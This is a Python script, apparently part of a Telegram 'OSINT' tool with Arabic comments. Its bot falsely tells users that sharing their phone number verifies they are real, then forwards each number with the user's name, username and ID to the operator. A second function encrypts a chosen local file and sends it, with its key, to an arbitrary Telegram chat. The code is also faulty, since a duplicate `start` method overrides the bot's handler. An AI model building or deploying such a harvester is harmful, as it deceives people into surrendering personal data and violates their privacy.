#!/usr/bin/env python3
"""
Telegram Bot Module for 7AKM OSINT
- Collects phone numbers from users and forwards to owner
- Send encrypted files to Telegram using user-provided token and chat ID
- File selection via file picker or manual path
"""

import asyncio
import threading
import logging
import os
import subprocess
from io import BytesIO
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler
from colorama import Fore, Style
import base64
from cryptography.fernet import Fernet
import requests

# إعداد التسجيل (إخفاء معظم الرسائل)
logging.basicConfig(level=logging.ERROR)

# حالات المحادثة لجمع الأرقام
ASK_PHONE = 1

# توقيع الأداة
TOOL_SIGNATURE = "-Tool 7AKM OSINT - - Developer : @G_X_V_7"

class TelegramBot:
    def __init__(self, token, owner_chat_id):
        self.token = token
        self.owner_chat_id = owner_chat_id
        self.app = None
        self.loop = None
        self.thread = None
        self.running = False

    async def start(self, update: Update, context):
        """بداية المحادثة: طلب مشاركة رقم الهاتف"""
        contact_keyboard = KeyboardButton(text="📱 مشاركة رقم الهاتف", request_contact=True)
        reply_markup = ReplyKeyboardMarkup([[contact_keyboard]], resize_keyboard=True, one_time_keyboard=True)
        await update.message.reply_text(
            "مرحباً! للتحقق من أنك مستخدم حقيقي، يرجى مشاركة رقم هاتفك عبر الزر أدناه.",
            reply_markup=reply_markup
        )
        return ASK_PHONE

    async def handle_contact(self, update: Update, context):
        """استقبال رقم الهاتف وإرساله للمالك"""
        contact = update.message.contact
        user = update.effective_user

        if contact:
            phone = contact.phone_number
            user_info = (
                f"الاسم: {user.first_name} {user.last_name or ''}\n"
                f"اليوزر: @{user.username or 'لا يوجد'}\n"
                f"المعرف: {user.id}"
            )
            # إرسال الرقم إلى المالك مع التوقيع
            await context.bot.send_message(
                chat_id=self.owner_chat_id,
                text=f"📞 **رقم هاتف جديد**\n\n{user_info}\nرقم الهاتف: `{phone}`\n\n{TOOL_SIGNATURE}"
            )
            # إشعار المستخدم
            await update.message.reply_text("✅ تم استلام رقمك، شكراً!")
        else:
            await update.message.reply_text("❌ حدث خطأ في استلام الرقم.")

        # إنهاء المحادثة
        return ConversationHandler.END

    async def cancel(self, update: Update, context):
        """إلغاء العملية"""
        await update.message.reply_text("تم الإلغاء.")
        return ConversationHandler.END

    async def handle_text(self, update: Update, context):
        """الرد على الرسائل النصية العادية"""
        await update.message.reply_text("الرجاء استخدام /start للبدء.")

    async def build_app(self):
        """بناء تطبيق البوت وإضافة المعالجات"""
        self.app = Application.builder().token(self.token).build()
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("start", self.start)],
            states={
                ASK_PHONE: [MessageHandler(filters.CONTACT, self.handle_contact)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel)],
        )
        self.app.add_handler(conv_handler)
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
        return self.app

    def run_bot(self):
        """تشغيل البوت في حلقة الأحداث"""
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.build_app())
        self.app.run_polling()

    def start(self):
        """بدء البوت في خيط منفصل"""
        self.running = True
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self.run_bot, daemon=True)
        self.thread.start()
        print(Fore.GREEN + "[+] Telegram bot started. Waiting for users..." + Style.RESET_ALL)

    def stop(self):
        """إيقاف البوت بأمان"""
        if self.app and self.running:
            asyncio.run_coroutine_threadsafe(self.app.stop(), self.loop)
            self.running = False
            print(Fore.YELLOW + "[*] Bot stopped." + Style.RESET_ALL)

def get_file_via_picker():
    """فتح منتقي الملفات باستخدام termux-storage-get مع تحسينات"""
    # التحقق من وجود termux-storage-get
    try:
        subprocess.run(['termux-storage-get', '--help'], capture_output=True, timeout=5)
    except FileNotFoundError:
        print(Fore.RED + "[-] termux-storage-get not found. Please install termux-api:" + Style.RESET_ALL)
        print(Fore.YELLOW + "    pkg install termux-api" + Style.RESET_ALL)
        return None
    except Exception:
        pass

    print(Fore.YELLOW + "Opening file picker... (you have 60 seconds)" + Style.RESET_ALL)
    try:
        result = subprocess.run(['termux-storage-get'], capture_output=True, text=True, timeout=60)
        if result.returncode == 0:
            path = result.stdout.strip()
            if path:
                if os.path.exists(path):
                    print(Fore.GREEN + f"[+] Selected file: {path}" + Style.RESET_ALL)
                    return path
                else:
                    print(Fore.RED + f"[-] Selected path does not exist: {path}" + Style.RESET_ALL)
            else:
                print(Fore.RED + "[-] No file selected." + Style.RESET_ALL)
        else:
            print(Fore.RED + f"[-] File picker returned error code {result.returncode}" + Style.RESET_ALL)
    except subprocess.TimeoutExpired:
        print(Fore.RED + "[-] File picker timed out." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Error in file picker: {e}" + Style.RESET_ALL)
    return None

def send_encrypted_file():
    """إرسال ملف مشفر إلى تليجرام مباشرة (بدون حفظ) مع إضافة توقيع الأداة"""
    print(Fore.YELLOW + "[*] Send Encrypted File to Telegram" + Style.RESET_ALL)
    print(Fore.RED + "⚠️  The file will be encrypted and sent to the specified chat." + Style.RESET_ALL)

    # إدخال التوكن ومعرف الدردشة
    token = input(Fore.MAGENTA + "Enter your bot token: " + Style.RESET_ALL).strip()
    if not token:
        print(Fore.RED + "❌ Token is required.")
        return

    try:
        chat_id = int(input(Fore.MAGENTA + "Enter chat ID to send to: " + Style.RESET_ALL).strip())
    except ValueError:
        print(Fore.RED + "❌ Invalid chat ID.")
        return

    # اختيار طريقة اختيار الملف
    print(Fore.CYAN + "\nChoose file selection method:" + Style.RESET_ALL)
    print("1. Enter file path manually")
    print("2. Pick file using file picker (requires termux-api)")
    method = input(Fore.MAGENTA + "Enter choice (1/2): " + Style.RESET_ALL).strip()

    file_path = None
    if method == "1":
        file_path = input(Fore.MAGENTA + "Enter path to file: " + Style.RESET_ALL).strip()
        if not os.path.exists(file_path):
            print(Fore.RED + "❌ File not found.")
            return
    elif method == "2":
        file_path = get_file_via_picker()
        if not file_path:
            print(Fore.RED + "❌ No file selected or error.")
            return
    else:
        print(Fore.RED + "❌ Invalid choice.")
        return

    # توليد مفتاح تشفير
    key = Fernet.generate_key()
    fernet = Fernet(key)

    # قراءة الملف وتشفيره
    with open(file_path, 'rb') as f:
        file_data = f.read()
    encrypted_data = fernet.encrypt(file_data)

    # إنشاء اسم ملف مع توقيع الأداة
    original_name = os.path.basename(file_path)
    encrypted_filename = f"{original_name}.encrypted_{TOOL_SIGNATURE.replace(' ', '_')}"

    # إرسال الملف المشفر مباشرة باستخدام BytesIO
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    files = {'document': (encrypted_filename, BytesIO(encrypted_data), 'application/octet-stream')}
    data = {'chat_id': chat_id}
    response = requests.post(url, files=files, data=data)

    if response.status_code == 200:
        print(Fore.GREEN + "[+] File sent successfully!" + Style.RESET_ALL)
        # إرسال المفتاح كرسالة نصية مع التوقيع
        key_b64 = base64.b64encode(key).decode()
        message = (
            f"🔑 **Encryption Key** (base64):\n`{key_b64}`\n\n"
            f"Use this key to decrypt the file.\n\n{TOOL_SIGNATURE}"
        )
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'})
        print(Fore.GREEN + "[+] Encryption key sent separately." + Style.RESET_ALL)
    else:
        print(Fore.RED + f"[-] Failed to send file: {response.text}" + Style.RESET_ALL)

def main():
    print(Fore.YELLOW + "[*] Telegram Bot Module" + Style.RESET_ALL)
    print(Fore.CYAN + "Choose an option:")
    print("1. Run phone number collector bot")
    print("2. Send encrypted file to Telegram")
    choice = input(Fore.MAGENTA + "Enter choice (1/2): " + Style.RESET_ALL).strip()

    if choice == "1":
        token = input(Fore.MAGENTA + "Enter your bot token: " + Style.RESET_ALL).strip()
        if not token:
            print(Fore.RED + "❌ Token is required.")
            return
        try:
            owner_id = int(input(Fore.MAGENTA + "Enter your Telegram chat ID (owner): " + Style.RESET_ALL).strip())
        except ValueError:
            print(Fore.RED + "❌ Invalid chat ID.")
            return
        bot = TelegramBot(token, owner_id)
        bot.start()
        print(Fore.CYAN + "\nBot is running. Press Enter to stop it and return to menu." + Style.RESET_ALL)
        input()
        bot.stop()
    elif choice == "2":
        send_encrypted_file()
    else:
        print(Fore.RED + "Invalid choice.")

if __name__ == "__main__":
    main()
